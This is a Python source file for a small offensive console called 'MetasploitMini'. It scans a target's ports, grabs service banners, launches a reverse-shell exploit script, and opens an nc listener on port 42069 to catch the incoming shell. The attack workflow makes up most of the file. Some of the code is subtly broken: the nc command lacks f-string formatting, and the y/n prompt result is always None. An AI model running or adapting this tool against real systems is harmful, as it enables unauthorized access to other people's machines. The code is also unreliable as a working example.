import cmd
import socket
import os
import pyfiglet
from termcolor import colored
import requests

banner = pyfiglet.figlet_format("Metasploit")
banner_colored = colored(banner, 'blue')
banner2 = pyfiglet.figlet_format("Mini")
banner2_colored = colored(banner2, 'red')
print(banner_colored + banner2_colored)
print(colored("Made by: Tommaso Bona", 'blue'))
print(colored("Github: https://github.com/ParzivalHack", 'blue'))
print(colored("Tip: try running the 'help' command.", 'blue'))

class MyCLI(cmd.Cmd):
    prompt = colored("MetasploitMini~$ ", 'red')
    
    def do_myip(self, arg):
         try:
            res = requests.get('https://api.ipify.org')
            print(colored(f"Your IP Address: {res.text}", 'blue'))
         except:
            answer = print(colored(input("Error getting IP address; wanna try with 'ifconfig' instead? (y/n)", 'red')))
            if answer == "y":
                os.system("ifconfig")
            if answer == "n":
                exit
    def __init__(self):
        super().__init__()
        self.target = ""
        self.exploit = ""
        self.attacker_ip = ""
      
    def  do_help(self, arg):
        print(colored("Commands List:", 'blue'))
        print(colored("- help, to show this help message", 'blue'))
        print(colored("- settarget, to set a global target", 'blue'))
        print(colored("- scan, to use the Port Scanner", 'blue'))
        print(colored("- banner, to use the Banner Grabber", 'blue'))
        print(colored("- setexploit, to set a global exploit", 'blue'))
        print(colored("- myip, to show your own IP address", 'blue'))
        print(colored("- setip, to set the attacker IP for the reverse shell", 'blue'))
        print(colored("- run, to run an exploit", 'blue'))
        print(colored("- exit, to exit MetasploitMini", 'blue'))
    	
    def do_setip(self, arg):
        self.attacker_ip = arg
        args = arg.split()
        if len(args) < 1:
            print(colored("Usage: setip <your ip>", 'yellow'))
            return
        print(colored(f"Attacker IP successfully set to {self.attacker_ip}", 'green'))	
    
    def do_scan(self, arg):
        if not self.target:
            print(colored("Target not set. Use 'settarget <target>' to set the target IP or website.", 'yellow'))
            return
        
        args = arg.split()
        if len(args) < 1:
            print(colored("Usage: scan <port range>", 'yellow'))
            return
        start_port, end_port = args[0].split("-")
        start_port = int(start_port)
        end_port = int(end_port)
        
        for port in range(start_port, end_port + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                print(colored(f"Port {port} is open", 'green'))
            sock.close()
            
    def do_banner(self, arg):
        if not self.target:
            print(colored("Target not set. Use 'settarget <target>' to set the target IP or website.", 'yellow'))
            return
        
        args = arg.split()
        if len(args) < 1:
            print(colored("Usage: banner <port>", 'yellow'))
            return
        port = int(args[0])
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target, port))
        sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
        response = sock.recv(1024)
        print(colored(f"Banner: {response.decode('utf-8')}", 'blue'))
        sock.close()
        
    def do_setexploit(self, arg):
        exploits = ["exploit1.py", "exploit2.py", "exploit3.py", "exploit4.py", "exploit5.py"]
        args = arg.split()
        if len(args) < 1:
            print(colored("Exploits list:", 'blue'))
            print(colored("1) Python Reverse Shell", 'blue'))
            print(colored("2) Not available yet", 'blue'))
            print(colored("3) Not available yet", 'blue'))
            print(colored("4) Not available yet", 'blue'))
            print(colored("5) Not available yet", 'blue'))
            print(colored("Usage: setexploit <exploit number>", 'yellow'))
            return
        exploit_num = int(args[0])
        if exploit_num < 1 or exploit_num > len(exploits):
            print(colored("Invalid exploit number", 'yellow'))
            return
        self.exploit = exploits[exploit_num-1]
        print(colored(f"Exploit successfully set to {self.exploit}", 'green'))

    def do_run(self, arg):
        try:
            if not self.target:
                print(colored("Target not set. Use 'settarget <target>' to set the target IP or website.", 'yellow'))
                return
            if not self.exploit:
                print(colored("Exploit not set. Use 'setexploit <exploit number>' to set the exploit.", 'yellow'))
                return
            if not self.attacker_ip:
                print(colored("Attacker IP not set. Use 'setip <your ip>' to set attacker IP.", 'yellow'))
                return
        except AttributeError:
            print(colored("Attacker IP not set. Use 'setip <your ip>' to set attacker IP.", 'yellow'))
            return
        os.system(f"python {self.exploit} {self.attacker_ip} &")
        os.system("nc -lvp 42069 -s {self.attacker_ip}") 
        
    def do_settarget(self, arg):
        self.target = arg
        print(colored(f"Target successfully set to {self.target}", 'green'))
        
    def do_exit(self, arg):
        return True

if __name__ == "__main__":
    cli = MyCLI()
    cli.cmdloop()
